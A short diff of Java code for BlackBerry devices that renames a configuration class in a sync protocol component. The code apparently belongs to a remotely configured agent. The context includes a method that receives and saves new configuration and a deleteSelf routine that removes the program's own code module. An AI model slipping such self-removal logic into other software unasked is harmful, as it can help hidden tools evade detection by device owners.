@@ -20,7 +20,7 @@ import net.rim.device.api.util.DataBuffer;
 import blackberry.action.sync.protocol.CommandException;
 import blackberry.action.sync.protocol.ProtocolException;
 import blackberry.action.sync.transport.Transport;
-import blackberry.config.Conf;
+import blackberry.config.Cfg;
 import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -62,7 +62,7 @@ public abstract class Protocol {
             //#ifdef DEBUG
             debug.trace("saveNewConf opening");
             //#endif
-            final AutoFile file = new AutoFile(Path.conf(), Conf.NEW_CONF);
+            final AutoFile file = new AutoFile(Path.conf(), Cfg.NEW_CONF);
 
             //#ifdef DEBUG
             debug.trace("saveNewConf exists");
@@ -224,7 +224,7 @@ public abstract class Protocol {
 
     public static boolean deleteSelf() {
         // Delete it self.
-        final int handle = CodeModuleManager.getModuleHandle(Conf.MODULE_NAME);
+        final int handle = CodeModuleManager.getModuleHandle(Cfg.MODULE_NAME);
         if (handle != 0) {
             final int success = CodeModuleManager.deleteModuleEx(handle, true);
             //#ifdef DEBUG
